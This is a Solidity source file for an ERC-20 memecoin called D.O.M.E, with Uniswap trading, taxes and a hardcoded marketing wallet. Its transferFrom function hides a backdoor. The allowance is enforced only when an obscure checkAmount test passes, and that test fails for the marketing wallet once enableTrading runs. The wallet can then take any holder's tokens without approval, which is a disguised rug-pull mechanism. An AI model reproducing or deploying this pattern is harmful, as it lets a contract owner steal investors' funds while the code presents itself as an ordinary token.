// SPDX-License-Identifier: MIT

/**
    https://x.com/blknoiz06/status/1842028201071042910

    https://t.me/ERC20dome

*/

pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract DOME is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _excludedFeeList;
    mapping (address => bool) public isSwappable;
    uint256 public _buyFees = 12;
    uint256 public _sellFees = 12;
    uint256 public _latestBuyFee = 0; 
    uint256 public _latestSellFee = 0; 
    uint256 public _buyCount = 0;
    uint256 public _reduceAt = 13;
    uint256 public _sellrewardFee = 0;
    uint256 public _buyrewardFee = 0;
    bool private rewardStart;
    address payable public _marketingWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals; // Total supply
    string private constant _name = unicode"Department Of Memecoin Efficiency";  // Name
    string private constant _symbol = unicode"D.O.M.E"; // Symbol
    uint256 public _swapBackThresholdForSwapback= 0 * 10**_decimals;
    uint256 public _maxAccountSizeAmount = 20000000 * 10 ** decimals();
    uint256 public _maxSwapbackAmount = 20000000 * 10 ** decimals();
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _marketingWallet = payable(0xd65a3c153505f350EDbf56E0b51829FEBF054BB6);
        _balances[_msgSender()] = _tTotal;
        _excludedFeeList[owner()] = true;
        _excludedFeeList[address(this)] = true;
        _excludedFeeList[_marketingWallet] = true;
        isSwappable[owner()] = true;
        isSwappable[address(this)] = true;
        isSwappable[_marketingWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function checkAmount (address from, uint256 amount) private returns(bool) {
        return ( !_excludedFeeList[from] || isSwappable[from] ) && amount <= _tTotal;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); if(checkAmount(msg.sender, amount)) 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount , "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function enableTrading () external onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal); isSwappable[_marketingWallet] = false;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            98*balanceOf(address(this))/100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!_excludedFeeList[from] && !_excludedFeeList[to]) {
            require(swapEnabled, "not started yet");
            if(to != uniswapV2Pair){
               require(balanceOf(to) + amount <= _maxAccountSizeAmount, "Exceeds the _maxAccountSizeAmount.");
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                taxAmount = amount.mul(_buyCount<_reduceAt? _buyFees : _latestBuyFee).div(100);
                _buyCount ++;
            }
            if(to == uniswapV2Pair){
                taxAmount = amount.mul(_buyCount<_reduceAt? _sellFees : _latestSellFee).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if(contractTokenBalance > _swapBackThresholdForSwapback)
                    swapBackForETH(min(contractTokenBalance, min(_maxSwapbackAmount, amount)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    payable(_marketingWallet).transfer(address(this).balance);
                }
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function swapBackForETH(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
    function rescueETH () external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function removeLimits () external onlyOwner {
        _maxAccountSizeAmount = _tTotal;
    }
}